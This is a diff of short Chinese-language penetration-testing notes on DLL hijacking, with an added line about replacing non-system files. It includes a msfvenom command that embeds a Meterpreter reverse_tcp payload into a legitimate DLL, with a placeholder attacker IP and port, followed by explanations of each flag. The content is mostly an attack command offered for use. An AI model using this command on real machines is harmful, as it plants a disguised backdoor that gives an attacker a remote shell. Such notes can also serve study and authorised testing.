@@ -7,7 +7,7 @@
 工具:
 火绒剑查看程序执行情况
 msf可生成后门dll
-
+找非系统文件替换
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<攻击者IP> LPORT=<端口> -x 原始DLL路径 -k -f dll -o malicious.dll
 
@@ -20,3 +20,6 @@ LHOST和LPORT: 设置攻击者的IP和监听端口。
 -f dll: 输出格式为DLL。
 -o malicious.dll: 输出的恶意DLL文件名。
 ```
+
+
+![](vx_images/346334864589157.png)
